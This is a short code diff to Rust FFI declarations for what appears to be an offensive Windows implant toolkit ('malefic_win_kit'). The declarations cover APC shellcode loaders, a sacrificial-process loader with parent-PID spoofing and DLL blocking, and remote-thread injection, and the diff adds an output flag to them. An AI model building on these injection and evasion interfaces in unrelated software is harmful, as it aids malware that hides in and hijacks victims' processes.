@@ -11,13 +11,18 @@ pub mod apis;
 #[cfg(feature = "prebuild")]
 #[link(name = "malefic_win_kit", kind = "static")]
 extern "C" {
-    pub fn ApcLoaderInline(bin: *const u8, bin_len: usize) -> RawString;
+    pub fn ApcLoaderInline(
+        bin: *const u8,
+        bin_len: usize,
+        need_output: bool
+    ) -> RawString;
     pub fn ApcLoaderSacriface(
         bin: *const u8,
         bin_len: usize,
         sacrifice_commandline: *mut i8,
         ppid: u32,
         block_dll: bool,
+        need_output: bool
     ) -> RawString;
     pub fn InjectRemoteThread(
         bin: *const u8,
